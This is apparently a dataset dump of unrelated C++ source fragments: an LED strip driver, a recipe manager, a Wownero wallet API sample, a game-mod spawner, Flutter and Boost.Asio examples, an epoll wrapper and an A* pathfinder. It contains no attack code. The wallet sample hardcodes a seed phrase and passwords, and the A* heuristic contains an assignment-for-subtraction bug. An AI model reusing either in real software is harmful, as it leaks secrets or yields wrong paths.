int2NeoPixel(g); // Get the SPI bytes for the green channel\n  vector<uint8_t> b_array = int2NeoPixel(b); // Get the SPI bytes for the blue channel\n\n  int cnt = 0;\n  vector<uint8_t> fullColor(24);\n  while(cnt < 24)\n  {\n    if (cnt < 8)\n    {\n      fullColor.at(cnt) = r_array.at(cnt); // Append the red SPI bytes to the fullColor array\n    }\n    else if (cnt < 16)\n    {\n      fullColor.at(cnt) = g_array.at(cnt-8); // Append the green SPI bytes to the fullColor array\n    }\n    else if (cnt < 24)\n    {\n      fullColor.at(cnt) = b_array.at(cnt-16); // Append the blue SPI bytes to the fullColor array\n    }\n    cnt++;\n  }\n  return fullColor;\n}\n\n// Fill the strip with a specific color\nvoid NeoSPI::fillStripRGB(uint8_t r = 0, uint8_t g = 0, uint8_t b = 0)\n{\n  Color newColor; // Putting the new color into the Color class\n  newColor.r = r;\n  newColor.g = g;\n  newColor.b = b;\n  stripState = std::vector<Color>(numPixels, newColor); // Saving the changes to the middle-man-buffer\n}\n\n// Set the color of a specific pixel\nbool NeoSPI::setPixelRGB(uint8_t r, uint8_t g, uint8_t b, int pos)\n{\n  if (pos >= numPixels) return false; // Return false if the LED doesn't exist\n  Color newColor;\n  newColor.r = r;\n  newColor.g = g;\n  newColor.b = b;\n  stripState.at(pos) = newColor; // Saving the changes to the middle-man-buffer\n  return true; // If the length isn't larger than the amount of LEDs on the strip return true\n}\n\nvoid NeoSPI::fillStrip(Color newColor)\n{\n  stripState = std::vector<Color>(numPixels, newColor); // Saving the changes to the middle-man-buffer\n}\n\n// Set the color of a specific pixel\nbool NeoSPI::setPixel(Color newColor, int pos)\n{\n  if (pos >= numPixels) return false; // Return false if the LED doesn't exist\n  stripState.at(pos) = newColor; // Saving the changes to the middle-man-buffer\n  return true; // If the length isn't larger than the amount of LEDs on the strip return true\n}\n\nvoid NeoSPI::show()\n{\n  Color activeElement; // Create new Color value\n  vector<uint8_t> col(24); // And a new raw SPI data value\n  int cntTotal = 0; // Counter initializations\n  int cntCol = 0;\n  int cnt = 0;\n  while(cnt < numPixels) // Looping through all of the LEDs\n  {\n    activeElement = stripState.at(cnt); // Retrieve color from middle-man-buffer\n    col = RGB2BitBang(activeElement.r, activeElement.g, activeElement.b); // Convert that RGB value to the raw SPI bytes\n    cntCol = 0; // Reset the color counter (complicated)\n    while (cntCol < sizeof(col) / sizeof(col.at(0))) { // Count through all 24 bytes of the raw SPI color value for the current LED\n        rawData.at(cntTotal) = col.at(cntCol); // Place that SPI value in the final array that (almost) represents the state of the physical LEDs\n        cntCol++; // Counter action\n    ",
    "#include <iostream>\n#include <string>\n#include <fstream>\n#include <sstream>\n#include <vector>\n#include <limits> \n\nusing namespace std;\nconst int days = 7;\nconst int meals = 3;\nstring daysOfWeek[days] = {\"Monday\", \"Tuesday\", \"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\", \"Sunday\"};\nstruct Recipe\n{\n    vector<string> recipe;\n    int m = 0;\n};\n\nRecipe add_line_in_vector(const string &line)\n{\n    Recipe recipe;\n    stringstream get(line);\n    string temp;\n    while (getline(get, temp, ','))\n    {\n        if (temp != \"directions\")\n        {\n            recipe.m++; // Count the number of ingredients\n        }\n        else\n        {\n            // Stop parsing ingredients when \"directions\" is encountered\n        }\n        recipe.recipe.push_back(temp);\n    }\n    return recipe;\n}\nvoid diabetes_eatable_checker(const string &file_name, const string &recipe_name)\n{\n    ifstream file(file_name);\n    if (!file.is_open())\n    {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n    string line;\n    Recipe recipe;\n    int flag = 0;\n    while (getline(file, line))\n    {\n        recipe = add_line_in_vector(line);\n        if (recipe_name == recipe.recipe[0])\n        {\n            flag=1;\n            for (int i = 2; i < recipe.m - 2; ++i)\n        {\n            if (\"sugar\" == recipe.recipe[i])\n            flag=2;\n        }\n            if(flag==2){\n                cout<<\"you can't eat \"<<recipe.recipe[0]<<\" because of diabetes\"<<endl;\n            }\n            else if(flag==1){\n                 cout<<\"you can eat \"<<recipe.recipe[0]<<endl;\n            }\n            break; // No need to continue searching after finding the recipe\n        }\n    }\n    if (flag == 0)\n    {\n        cout << \"Recipe not found.\" << endl;\n    }\n    file.close();\n}\nvoid searchRecipe(const string &file_name, const string &recipe_name)\n{\n    ifstream file(file_name);\n    if (!file.is_open())\n    {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n    string line;\n    Recipe recipe;\n    int flag = 0;\n    while (getline(file, line))\n    {\n        recipe = add_line_in_vector(line);\n        if (recipe_name == recipe.recipe[0])\n        {\n            flag = 1; // Recipe found\n            cout << \"Recipe Name: \" << recipe.recipe[0] << endl;\n            cout << \"Category: \" << recipe.recipe[1] << endl;\n            cout << \"Ingredients:\" << endl;\n            for (int i = 2; i < recipe.recipe.size(); ++i)\n            {\n                if (recipe.recipe[i] == \"directions\")\n                {\n                    cout << \"Directions :\" << endl;\n                }\n                else if (recipe.recipe[i] == \"Directions :\")\n                {\n                    continue;\n                }\n                else\n                    cout << \"-\"<<recipe.recipe[i] << endl;\n            }\n\n            break; // No need to continue searching after finding the recipe\n        }\n    }\n    if (flag == 0)\n    {\n        cout << \"Recipe not found.\" << endl;\n    }\n    file.close();\n}\nvoid display_recipe_category(const string &file_name) {\n    ifstream file(file_name);\n    if (!file.is_open()) {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n\n    string line;\n    while (getline(file, line)) {\n        Recipe recipe = add_line_in_vector(line);\n        cout << \"Recipe: \" << recipe.recipe[0] << \" - Category: \" << recipe.recipe[1] << endl;\n    }\n    \n    file.close();\n}\n\nvoid ingredientsearch(const string &file_name, const string &ingredient_name)\n{\n    ifstream file(file_name);\n    if (!file.is_open())\n    {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n    string line;\n    Recipe recipe;\n    int flag = 0;\n    while (getline(file, line))\n    {\n        recipe = add_line_in_vector(line);\n        for (int i = 2; i < recipe.m - 2; ++i)\n        {\n            if (ingredient_name == recipe.recipe[i])\n            {\n                flag = 1;\n                cout << recipe.recipe[0] << endl;\n            }\n        }\n    }\n    if (flag == 0)\n    {\n        cout << \"No recipe contain these ingredients.\" << endl;\n    }\n    file.close();\n}\n\nvoid recipe_adder(const string &rec_name, const string &rec_type, const string &rec_ings, const string &rec_steps, ofstream &tracker)\n{\n    tracker << rec_name << \",\" << rec_type << \",\" << rec_ings << \",directions,\" << rec_steps << endl;\n    tracker.seekp(-1, ios_base::cur);   //to move to the file pointer to starting of the file\n}\n\nvoid recipe_deleter(const string& filename, const string& recipe_name) {\n    ifstream infile(filename);\n    if (!infile) {\n        cerr << \"Error: Unable to open file \" << filename << endl;  //error  meassage\n        return;\n    }\n    //creating vector to hold strings\n    vector<string> lines;\n    string line;\n    \n    while (getline(infile, line)) {\n    if (line.find(recipe_name) == string::npos) {\n        lines.push_back(line);\n    }\n    else\n    cout << \"Recipe has been deleted.\" << endl;\n    }\n\n    infile.close();\n    ofstream outfile(filen",
    "#include <stdio.h>\n#include <iostream>\n#include \"wallet2.h\"\n#include \"wallet/wownero_wallet_full.h\"\n#include \"utils/wownero_utils.h\"\n\nusing namespace std;\n\nbool FUNDS_RECEIVED = false;\n\n/**\n * This code introduces the API.\n *\n * NOTE: depending on feedback, fields might change to become private and accessible only\n * through public accessors/mutators for pure object-oriented, etc.\n */\nint main(int argc, const char* argv[]) {\n\n//  // configure logging\n//  mlog_configure(\"log_cpp_sample_code.txt\", true);\n//  mlog_set_log_level(1);\n\n  // create a wallet from a seed phrase\n  wownero_wallet_config wallet_config;\n  wallet_config.m_seed = \"hefty value later extra artistic firm radar yodel talent future fungal nutshell because sanity awesome nail unjustly rage unafraid cedar delayed thumbs comb custom sanity\";\n  wallet_config.m_path = \"MyWalletRestored\";\n  wallet_config.m_password = \"supersecretpassword123\";\n  wallet_config.m_network_type = wownero_network_type::STAGENET;\n  wallet_config.m_server = wownero_rpc_connection(\"http://localhost:38081\", \"superuser\", \"abctesting123\");\n  wallet_config.m_restore_height = 380104;\n  wallet_config.m_seed_offset = \"\";\n  wownero_wallet* wallet_restored = wownero_wallet_full::create_wallet(wallet_config);\n\n  // synchronize the wallet and receive progress notifications\n  struct : wownero_wallet_listener {\n    void on_sync_progress(uint64_t height, uint64_t start_height, uint64_t end_height, double percent_done, const string& message) {\n      // feed a progress bar?\n    }\n  } my_sync_listener;\n  wallet_restored->sync(my_sync_listener);\n\n  // start syncing the wallet continuously in the background\n  wallet_restored->start_syncing();\n\n  // get balance, account, subaddresses\n  string restored_primary = wallet_restored->get_primary_address();\n  uint64_t balance = wallet_restored->get_balance(); // can specify account and subaddress indices\n  wownero_account account = wallet_restored->get_account(1, true); // get account with subaddresses\n  uint64_t unlocked_account_balance = account.m_unlocked_balance.get(); // get boost::optional value\n\n  // query a transaction by hash\n  wownero_tx_query tx_query;\n  tx_query.m_hash = \"314a0f1375db31cea4dac4e0a51514a6282b43792269b3660166d4d2b46437ca\";\n  vector<shared_ptr<wownero_tx_wallet>> txs = wallet_restored->get_txs(tx_query);\n  shared_ptr<wownero_tx_wallet> tx = txs[0];\n  for (const shared_ptr<wownero_transfer> transfer : tx->get_transfers()) {\n    bool is_incoming = transfer->is_incoming().get();\n    uint64_t in_amount = transfer->m_amount.get();\n    int account_index = transfer->m_account_index.get();\n  }\n  wownero_utils::free(txs);\n\n  // query incoming transfers to account 1\n  wownero_transfer_query transfer_query;\n  transfer_query.m_is_incoming = true;\n  transfer_query.m_account_index = 1;\n  vector<shared_ptr<wownero_transfer>> transfers = wallet_restored->get_transfers(transfer_query);\n  wownero_utils::free(transfers);\n\n  // query unspent outputs\n  wownero_output_query output_query;\n  output_query.m_is_spent = false;\n  vector<shared_ptr<wownero_output_wallet>> outputs = wallet_restored->get_outputs(output_query);\n  wownero_utils::free(outputs);\n\n  // create and sync a new wallet with a random seed\n  wallet_config = wownero_wallet_config();\n  wallet_config.m_path = \"MyWalletRandom\";\n  wallet_config.m_password = \"supersecretpassword123\";\n  wallet_config.m_network_type = wownero_network_type::STAGENET;\n  wallet_config.m_server = wownero_rpc_connection(\"http://localhost:38081\", \"superuser\", \"abctesting123\");\n  wallet_config.m_language = \"English\";\n  wownero_wallet* wallet_random = wownero_wallet_full::create_wallet(wallet_config);\n  wallet_random->sync();\n\n  // synchronize in the background every 5 seconds\n  wallet_random->start_syncing(5000);\n\n  // get wallet info\n  string random_seed = wallet_random->get_seed();\n  string random_primary = wallet_random->get_primary_address();\n  uint64_t random_height = wallet_random->get_height();\n  bool random_is_synced = wallet_random->is_synced();\n\n  // receive notifications when the wallet receives funds\n  struct : wownero_wallet_listener {\n    void on_output_received(const wownero_output_wallet& output) {\n      cout << \"Wallet received funds!\" << endl;\n      uint64_t amount = output.m_amount.get();\n      string tx_hash = output.m_tx->m_hash.get();\n      bool is_confirmed = output.m_tx->m_is_confirmed.get();\n      bool is_locked = static_pointer_cast<wownero_tx_wallet>(output.m_tx)->m_is_locked.get();\n      int account_index = output.m_account_index.get();\n      int subaddress_index = output.m_subaddress_index.get();\n      FUNDS_RECEIVED = true;\n    }\n  } my_listener;\n  wallet_random->add_listener(my_listener);\n\n  // send funds from the restored wallet to the random wallet\n  wownero_tx_config tx_config;\n  tx_config.m_account_index = 0;\n  tx_config.m_address = wallet_random->get_address(1, 0);\n  tx_config.m_amount = 50000;\n  tx_config.m_relay = true;\n  shared_ptr<wownero_tx_wallet> sent_tx = wallet_restored->",
    "// Originally written by Ricbent\r\n\r\n#include \"actorspawner.hpp\"\r\n\r\nncp_over(0x020399D4) static constexpr const ActorProfile* profile = &ActorSpawner::profile;\r\n\r\nvoid ActorSpawner::doSpawn() {\r\n\r\n\tVec3 sPos = position;\r\n\tsPos.y -= 0x10000;\t\t// Origin pos: Bottom-left of sprite\r\n\r\n\tsPos.x += spawnerSettings->offsetX * 0x1000;\r\n\tsPos.y += spawnerSettings->offsetY * 0x1000;\r\n\r\n\tu16 objID = spawnerSettings->objectID;\r\n\r\n\tif (sActor) {\r\n\t\tStageEntity* spawnedActor = rcast<StageEntity*>(spawnActor(objID, spawnerSettings->settings, &sPos));\r\n\t\tif (objID == 103 || objID == 185) {\r\n\t\t\tspawnedActor->collisionSwitch |= 0x4620; // manually set spikedball collision switch lmao\r\n\t\t}\t\t\t\t\t\t // has to be a better way of doing this\r\n\t}\r\n\r\n\tsPos.x += spawnerSettings->particleOffsetX * 0x1000;\r\n\tsPos.y += spawnerSettings->particleOffsetY * 0x1000;\r\n\r\n\tif (sParticles) {\r\n\t\tParticle::Handler::createParticle(spawnerSettings->particleID, sPos);\r\n\t}\r\n\r\n\tif (sSFX) {\r\n\t\tSound::playSFXUnique(spawnerSettings->sfxID, &sPos);\r\n\t}\r\n\r\n\tactorSpawned = true;\r\n}\r\n\t\r\ns32 ActorSpawner::onCreate() {\r\n\r\n\tactorSpawned = false;\r\n\r\n\tspawnerSettingsID = (settings & 0xFF0000) >> 16;\r\n\tspawnerSettings = rcast<ActorSpawnerSettings*>(Stage::stageBlocks.objectBanks + 16 + spawnerSettingsID*16);\r\n\r\n\tsActor = (settings & 0x4000) == 0;\r\n\tsParticles = (settings & 0x1000) == 0;\r\n\tsSFX = (settings & 0x2000) == 0;\r\n\tsFirstTick = (settings & 0x8000) == 0;\r\n\r\n\teventID = settings >> 24;\r\n\teventWasActive = false;\r\n\tspawnDelay = settings & 0xFFF;\r\n\ttimer = 0;\r\n\r\n\treturn 1;\r\n}\r\n\r\nbool ActorSpawner::updateMain() {\r\n\r\n\tif (eventID == 0 && spawnDelay == 0)\r\n\t\treturn 1;\r\n\r\n\tif (spawnDelay == 0) { // no spawn delay set\r\n\t\tif (Stage::getEvent(eventID) && actorSpawned)\r\n\t\t\treturn 1;\r\n\r\n\t\tif (!Stage::getEvent(eventID) && actorSpawned) \r\n\t\t\tactorSpawned = false;\r\n\r\n\t\tif (Stage::getEvent(eventID) && !actorSpawned){ \r\n\t\t\tdoSpawn();\r\n\t\t}\r\n\r\n\t} else {\r\n\t\tif (eventID == 0) eventActive = true;\r\n\t\telse eventActive = Stage::getEvent(eventID);\r\n\r\n\t\tif (eventWasActive && !eventActive)\r\n\t\t\ttimer = 0;\r\n\r\n\t\tif (eventActive) {\r\n\t\t\tif (sFirstTick && !eventWasActive)\r\n\t\t\t\tdoSpawn();\r\n\t\t\tif (timer > spawnDelay) {\r\n\t\t\t\tdoSpawn();\r\n\t\t\t\ttimer = 0;\r\n\t\t\t}\r\n\t\t\ttimer++;\r\n\t\t}\r\n\r\n\t\teventWasActive = eventActive;\r\n\t}\r\n\r\n\tdestroyInactive(0);\r\n\r\n\treturn 1;\r\n}\r\n\r\ns32 ActorSpawner::onDestroy() {\r\n\treturn 1;\r\n}\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "\n#include <boost/asio/any_io_executor.hpp>\n#include <boost/asio/awaitable.hpp>\n#include <boost/asio/bind_cancellation_slot.hpp>\n#include <boost/asio/buffer.hpp>\n#include <boost/asio/cancellation_signal.hpp>\n#include <boost/asio/cancellation_type.hpp>\n#include <boost/asio/co_spawn.hpp>\n#include <boost/asio/connect.hpp>\n#include <boost/asio/deferred.hpp>\n#include <boost/asio/io_context.hpp>\n#include <boost/asio/ip/address.hpp>\n#include <boost/asio/ip/address_v4.hpp>\n#include <boost/asio/ip/tcp.hpp>\n#include <boost/asio/read_until.hpp>\n#include <boost/asio/steady_timer.hpp>\n#include <boost/asio/this_coro.hpp>\n#include <boost/asio/write.hpp>\n#include <boost/system/error_code.hpp>\n\n#include <chrono>\n#include <cstddef>\n#include <exception>\n#include <iostream>\n#include <string>\n#include <string_view>\n\nnamespace asio = boost::asio;\nusing boost::system::error_code;\n\n// The GET HTTP request to send to the server\nstatic constexpr std::string_view request =\n    \"GET / HTTP/1.1\\r\\n\"\n    \"Host: example.com\\r\\n\"\n    \"User-Agent: Asio\\r\\n\"\n    \"Accept: */*\\r\\n\\r\\n\";\n\nasio::awaitable<void> handle_request_impl()\n{\n    // Coroutines know which executor are using\n    asio::any_io_executor ex = co_await asio::this_coro::executor;\n\n    // I/O objects\n    asio::ip::tcp::socket sock(ex);\n    asio::ip::tcp::resolver resolv(ex);\n    asio::steady_timer timer(ex);\n\n    // Resolve the hostname and port into a set of endpoints\n    auto endpoints = co_await resolv.async_resolve(\"example.com\", \"80\", asio::deferred);\n\n    // Connect to the server\n    co_await asio::async_connect(sock, endpoints, asio::deferred);\n\n    // Simulate a delay\n    timer.expires_after(std::chrono::seconds(8));\n    co_await timer.async_wait(asio::deferred);\n\n    // Write the request\n    co_await asio::async_write(sock, asio::buffer(request), asio::deferred);\n\n    // Read the response\n    std::string buff;\n    std::size_t bytes_read = co_await asio::async_read_until(\n        sock,\n        asio::dynamic_buffer(buff),\n        \"\\r\\n\\r\\n\",\n        asio::deferred\n    );\n    std::cout << std::string_view(buff.data(), bytes_read) << std::endl;\n}\n\nint main()\n{\n    // Execution context\n    asio::io_context ctx;\n\n    // I/O objects\n    asio::ip::tcp::socket sock{ctx};\n    asio::steady_timer timer{ctx};\n\n    // An object that can emit a signal to cause per-operation cancellation.\n    asio::cancellation_signal sig;\n\n    // Wait 5 seconds, then trigger cancellation\n    timer.expires_after(std::chrono::seconds(5));\n    timer.async_wait([&sig](error_code) {\n        // When the timer fires, trigger cancellation\n        sig.emit(asio::cancellation_type::terminal);\n    });\n\n    // co_spawn is a regular initiating function, so we can use the same cancellation mechanism.\n    // The slot is propagated to the coroutine, and to individual functions by co_await.\n    // Note that proxy cancellation_signal's and slots are created in the process\n    asio::co_spawn(\n        ctx,\n        handle_request_impl,\n        asio::bind_cancellation_slot(\n            sig.slot(),\n            [](std::exception_ptr ptr) {\n                if (ptr)\n                    std::rethrow_exception(ptr);\n            }\n        )\n    );\n\n    // Run the application\n    ctx.run();\n}",
    "/**\n * @file epoller.cpp\n * @author Fansure Grin\n * @date 2024-03-24\n * @brief source file for epoller\n*/\n#include <unistd.h>     // close\n#include <cassert>      // assert\n#include \"epoller.h\"\n\n\n/**\n * @brief \u521d\u59cb\u5316\u4e00\u4e2a Epoller \u5b9e\u4f8b\n * @param max_evnent_number \u6700\u5927\u4e8b\u4ef6\u6570\u91cf\uff0c\u9ed8\u8ba4\u4e3a`1024`\n*/\nEpoller::Epoller(int max_event_number)\n: epoll_fd(epoll_create(512)), events(max_event_number) {\n    assert(epoll_fd >= 0 && events.size() > 0);\n}\n\n/**\n * @brief \u9500\u6bc1\u4e00\u4e2a Epoller \u5b9e\u4f8b\n*/\nEpoller::~Epoller() {\n    close(epoll_fd);\n}\n\n/**\n * @brief \u4e3a\u6307\u5b9a\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u6ce8\u518c\u4e8b\u4ef6\n * @param fd \u88ab\u6ce8\u518c\u4e8b\u4ef6\u7684\u76ee\u6807\u6587\u4ef6\u63cf\u8ff0\u7b26\n * @param events \u88ab\u6ce8\u518c\u7684\u4e8b\u4ef6\n * @return \u662f\u5426\u6ce8\u518c\u6210\u529f\n*/\nbool Epoller::add_fd(int fd, uint32_t events) {\n    if (fd < 0) return false;\n    epoll_event event;\n    event.data.fd = fd;\n    event.events = events;\n    return epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &event) == 0;\n}\n\n/**\n * @brief \u4ece epollfd \u6807\u8bc6\u7684 epoll \u5185\u6838\u4e8b\u4ef6\u8868\u4e2d\u4fee\u6539 fd \u4e0a\u7684\u6ce8\u518c\u4e8b\u4ef6\n * @param fd \u88ab\u4fee\u6539\u4e8b\u4ef6\u7684\u76ee\u6807\u6587\u4ef6\u63cf\u8ff0\u7b26\n * @param events \u65b0\u7684\u4e8b\u4ef6\n * @return \u662f\u5426\u4fee\u6539\u6210\u529f\n*/\nbool Epoller::mod_fd(int fd, uint32_t events) {\n    if (fd < 0) return false;\n    epoll_event event;\n    event.data.fd = fd;\n    event.events = events;\n    return epoll_ctl(epoll_fd, EPOLL_CTL_MOD, fd, &event) == 0;\n}\n\n/**\n * @brief \u4ece epollfd \u6807\u8bc6\u7684 epoll \u5185\u6838\u4e8b\u4ef6\u8868\u4e2d\u5220\u9664 fd \u4e0a\u7684\u6240\u6709\u6ce8\u518c\u4e8b\u4ef6\uff0c\u5e76\u5173\u95ed fd\n * @param fd \u76ee\u6807\u6587\u4ef6\u63cf\u8ff0\u7b26\n * @return \u662f\u5426\u5220\u9664\u6210\u529f\n*/\nbool Epoller::del_fd(int fd) {\n    if (fd < 0) return false;\n    // Since Linux 2.6.9, event can be specified as NULL when using EPOLL_CTL_DEL. \n    // However, applications that need to be portable to kernels before \n    // Linux 2.6.9 should specify a non-null pointer in event.\n    epoll_event event = {0};\n    return epoll_ctl(epoll_fd, EPOLL_CTL_DEL, fd, &event) == 0;\n}\n\n/**\n * @brief \u7b49\u5f85 I/O \u4e8b\u4ef6\n * @param timeout \u8d85\u65f6\u65f6\u95f4\uff0c\u5355\u4f4d\u4e3a\u6beb\u79d2(milliseconds)\n * @return \u4e3a\u8bf7\u6c42\u7684 I/O \u51c6\u5907\u597d\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u6570\u91cf\n*/\nint Epoller::wait(int timeout) {\n    return epoll_wait(epoll_fd, &events[0], static_cast<int>(events.size()), timeout);\n}\n\n/**\n * @brief \u83b7\u53d6\u6709\u4e8b\u4ef6\u53d1\u751f\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\n * @param idx \u7d22\u5f15\n * @return \u6587\u4ef6\u63cf\u8ff0\u7b26\n*/\nint Epoller::get_event_fd(size_t idx) const {\n    assert(idx >= 0 && idx < events.size());\n    return events[idx].data.fd;\n}\n\n/**\n * @brief \u83b7\u53d6\u4e8b\u4ef6\n * @param idx \u7d22\u5f15\n * @return \u4e8b\u4ef6\n*/\nuint32_t Epoller::get_events(size_t idx) const {\n    assert(idx >= 0 && idx < events.size());\n    return events[idx].events;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"brainwave\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\n#include<vector>\n#include<string.h>\n#include<queue>\n#include<fstream>\nconst int N = 200;\nbool vis[N][N]; // // A*\u7b97\u6cd5\u4e2d\u68c0\u6d4b\u662f\u5426\u8d70\u8fc7\u6b64\u8def\u5f84\nconst int n=N;// \u5730\u56fe\u7684\u5927\u5c0f, \u8fd9\u91cc\u6700\u5927\u4e0d\u80fd\u8d85\u8fc7N\u8fd9\u4e2a\u5e38\u91cf\u7684\u503c\n\nchar Map[N][N];\t\t// \u8f93\u5165\u7684\u5730\u56fe\nclass Position {\npublic:\n\tint x;\n\tint y;\n\tPosition(int x, int y) {\n\t\tthis->x = x;\n\t\tthis->y = y;\n\t}\n\tPosition() {\n\t\tx = -1;\n\t\ty = -1;\n\t}\n\tbool operator==(const Position &a) {\n\t\treturn (this->x == a.x) && (this->y == a.y);\n\t}\n};\nclass Point {\npublic:\n\tint x, y;\n\tint f, g, h;\n\tbool operator==(const Point& pos) {\n\t\treturn (pos.x == x && pos.y == y);\n\t}\n\tPoint(const Position& pos) {\n\t\tx = pos.x;\n\t\ty = pos.y;\n\t}\n\tPoint() {\t}\n\tvoid geth(Point beginpos, Point endpos) {\n\t\tint x = std::abs(beginpos.x = endpos.x);\n\t\tint y = std::abs(beginpos.y - endpos.y);\n\t\th = x + y;\n\t}\n\t\n\tvoid getf() {\n\t\tf = g + h;\n\t}\n};\nclass TreeNode {\n\t\npublic:\n\tPoint pos;\n\tTreeNode* pParent;\n\tstd::vector<TreeNode*> pChild;\n\t\n\t\n\tTreeNode(Point pos) {\n\t\tthis->pos = pos;\n\t\tpParent = nullptr;\n\t}\n};\nbool CanWalk(char ch[N][N], bool vis[N][N], const Point& pos)\n{\n\t//\u5982\u679c\u8d8a\u754c\uff0c\u4e0d\u80fd\u8d70\n\tif (pos.x <= 0 || pos.y <= 0 || pos.x > n || pos.y > n)\n\t{\n\t\treturn false;\n\t}\n\t//\u8d8a\u754c\n\t\n\tif (ch[pos.x][pos.y] =='#'||ch[pos.x][pos.y]=='*'|| ch[pos.x][pos.y] == 'A')// \u540e\u9762\u9700\u8981\u4fee\u6539, \u6b64\u5904\u68c0\u6d4b\u662f\u5426\u5904\u4e8e\u7a7a\u5730, \u540e\u7eed\u9700\u8981\u8003\u8651\u5bfb\u8def\u65f6\u8def\u4e0a\u7684\u673a\u5668\u4eba\n\t{\n\t\treturn false;\n\t}\n\t\n\tif (vis[pos.x][pos.y])\n\t{\n\t\treturn false;\n\t}\n\treturn true;//\u5426\u5219\u80fd\u8d70\n}\n\n\n\n\nstd::vector<Position> GetPathbyPosition(Position start, Position end) {\n\t//\u8fd4\u56de\u4e00\u4e2avector, \u5176\u4e2d\n\t//0\u4ee3\u8868\u5411\u53f3\n\t//1\u4ee3\u8868\u5411\u5de6\n\t//3\u4ee3\u8868\u5411\u4e0b\n\t//2\u4ee3\u8868\u5411\u4e0a \n\t//\u5982\u679c\u9700\u8981\u5f97\u5230\u4e24\u70b9\u95f4\u66fc\u54c8\u987f\u8ddd\u79bb\u83b7\u53d6vector\u7684size\u5373\u53ef\n\t//\u521d\u59cb\u5316\u90e8\u5206\n\tmemset(vis, false, sizeof(vis));\n\tPoint beginpos(start);\n\tPoint endpos(end);\n\tTreeNode* pRoot = new TreeNode(beginpos);\n\tstruct cmp {\n\t\tbool operator()(const TreeNode* a, const TreeNode*b) {\n\t\t\treturn a->pos.f > b->pos.f;\n\t\t}\n\t};\n\tstd::priority_queue<TreeNode*,std::vector<TreeNode*>,cmp> buff;//\u6682\u5b58\u63a2\u7d22\u8fc7\u7684\u70b9\n\tTreeNode* pCurrent = pRoot;\n\tTreeNode* pTemp = nullptr;\n\tbool isfind = false;\n\t//\u521d\u59cb\u5316\u7ed3\u675f\n\tstd::vector<Position> Path;\n\t\n\twhile (1) {\n\t\t\n\t\t\n\t\tfor (int i = 0; i <= 3; i++) {\n\t\t\tpTemp = new TreeNode(pCurrent->pos);\n\t\t\tswitch (i)\n\t\t\t{\n\t\t\t\tcase 2://up\n\t\t\t\tpTemp->pos.x--;\n\t\t\t\tpTemp->pos.g += 1;\n\t\t\t\tbreak;\n\t\t\t\tcase 3://down\n\t\t\t\tpTemp->pos.x++;\n\t\t\t\tpTemp->pos.g += 1;\n\t\t\t\tbreak;\n\t\t\t\tcase 1://left\n\t\t\t\tpTemp->pos.y--;\n\t\t\t\tpTemp->pos.g += 1;\n\t\t\t\tbreak;\n\t\t\t\tcase 0://right\n\t\t\t\tpTemp->pos.y++;\n\t\t\t\tpTemp->pos.g += 1;\n\t\t\t\tbreak;\n\t\t\t\t\n\t\t\t}\n\t\t\tif (CanWalk(Map, vis, pTemp->pos)) {\n\t\t\t\tpTemp->pos.geth(pTemp->pos, 